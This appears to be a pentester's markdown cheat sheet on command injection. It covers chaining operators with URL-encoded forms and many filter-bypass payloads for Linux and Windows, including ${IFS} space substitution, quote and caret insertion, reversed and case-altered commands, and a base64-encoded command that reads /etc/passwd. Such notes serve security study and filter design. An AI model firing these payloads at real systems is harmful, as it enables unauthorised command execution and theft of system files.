#web #command-injection #rce #bypass

# Command Injection

Related: [file-inclusion](file-inclusion.md) · [injection-attacks](injection-attacks.md) · [whitebox-cmdi](../CodeReview/whitebox-cmdi.md) · [privesc](../Linux/privesc.md)

## Injection Operators
```
;   %3b   both commands run
&&  %26%26  second runs only if first succeeds
||  %7c%7c  second runs only if first fails
|   %7c   pipe (only second output shown)
```
Chaining operators (URL-encoded forms shown).

```
$(command)   %24%28%29
`command`    %60%60
```
Sub-shell execution (Linux).

## Linux — Space Bypass
```bash
${IFS}
```
Replaced with a space+tab (not usable inside `$()`).

```bash
{ls,-la}
```
Commas become spaces (brace expansion).

```bash
%09
```
Tab instead of space (URL-encoded).

## Linux — Other Char Substitution
```bash
${PATH:0:1}
```
Yields `/`.

```bash
${LS_COLORS:10:1}
```
Yields `;`.

## Linux — Blacklist Bypass
```bash
w'h'o'am'i
```
Insert quotes (total must be even) to break keyword matching (also `$@`, `\`).

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
Case manipulation to evade case-sensitive filters.

```bash
$(rev<<<'imaohw')
```
Execute a reversed command.

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
Decode and execute a base64-encoded command.

## Windows — Bypasses
```powershell
Get-ChildItem Env:
```
List environment variables (PowerShell) — source of char substitutions.

```cmd
%PROGRAMFILES:~10,-5%
```
Expands to a space (CMD); `$env:PROGRAMFILES[10]` in PowerShell.

```cmd
%HOMEPATH:~0,-17%
```
Expands to `\` (CMD); `$env:HOMEPATH[0]` in PowerShell.

```cmd
who^ami
```
Caret insertion to break keyword matching (CMD, total carets even).

```powershell
WhOaMi
```
Odd-case command (Windows commands are case-insensitive).
